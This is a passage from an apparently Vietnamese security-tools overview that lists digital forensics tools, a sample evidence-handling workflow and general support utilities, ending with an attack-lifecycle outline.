-   bulk-extractor, binwalk, foremost/scalpel

```{=html}
<!-- -->
```
-   Tạo image, khôi phục & cứu dữ liệu

```{=html}
<!-- -->
```
-   ddrescue/dc3dd, guymager, testdisk/photorec

```{=html}
<!-- -->
```
-   Timeline & hash

```{=html}
<!-- -->
```
-   plaso (log2timeline), hashdeep

```{=html}
<!-- -->
```
-   Quy trình mẫu Forensics

```{=html}
<!-- -->
```
-   Tạo bản sao bảo toàn bằng chứng

```{=html}
<!-- -->
```
-   ddrescue hoặc guymager để clone ổ đĩa → làm việc trên bản copy.

```{=html}
<!-- -->
```
-   Phân tích disk image

```{=html}
<!-- -->
```
-   Autopsy / SleuthKit để duyệt file, tìm file xóa, metadata.

```{=html}
<!-- -->
```
-   Carving dữ liệu ẩn

```{=html}
<!-- -->
```
-   foremost, scalpel để khôi phục file đã xóa.

```{=html}
<!-- -->
```
-   Phân tích memory dump

```{=html}
<!-- -->
```
-   Volatility để tìm process, kết nối, mã độc đang chạy.

```{=html}
<!-- -->
```
-   Trích xuất thông tin quan trọng

```{=html}
<!-- -->
```
-   bulk-extractor, binwalk, exiftool.

```{=html}
<!-- -->
```
-   Tạo timeline sự kiện

```{=html}
<!-- -->
```
-   log2timeline → phân tích hành vi theo thời gian.

```{=html}
<!-- -->
```
-   Bảo đảm tính toàn vẹn bằng chứng

```{=html}
<!-- -->
```
-   hashdeep để xác nhận file không bị thay đổi.

16 -- Services & Other Tools (dịch vụ & tiện ích)

-   Nhóm này không trực tiếp khai thác hay tấn công, mà đóng vai trò hỗ
    trợ trong suốt chiến dịch:

```{=html}
<!-- -->
```
-   Kết nối an toàn tới môi trường test.

-   Quản lý container/máy ảo để mô phỏng hoặc chạy payload.

-   Quản lý phiên làm việc khi SSH vào nhiều máy.

-   Chạy script, tải file, xử lý dữ liệu JSON...

```{=html}
<!-- -->
```
-   Các công cụ & mục đích

```{=html}
<!-- -->
```
-   VPN & Kết nối bảo mật

```{=html}
<!-- -->
```
-   OpenVPN/WireGuard, OpenSSH (client/server)

```{=html}
<!-- -->
```
-   Container & Máy ảo

```{=html}
<!-- -->
```
-   Docker/Podman, QEMU/KVM

```{=html}
<!-- -->
```
-   Quản lý phiên & automation

```{=html}
<!-- -->
```
-   tmux/screen, Git

```{=html}
<!-- -->
```
-   Download & xử lý file/script

```{=html}
<!-- -->
```
-   curl/wget, editors (vim/nano)

```{=html}
<!-- -->
```
-   Ngôn ngữ & xử lý dữ liệu

```{=html}
<!-- -->
```
-   Python3/pip, jq

Recon → Resource Dev → Initial Access → Execution → Persistence →
PrivEsc → Defense Evasion → Cred Access → Discovery → Lateral Movement →
Collection → C2 → Exfiltration → Impact → Forensics
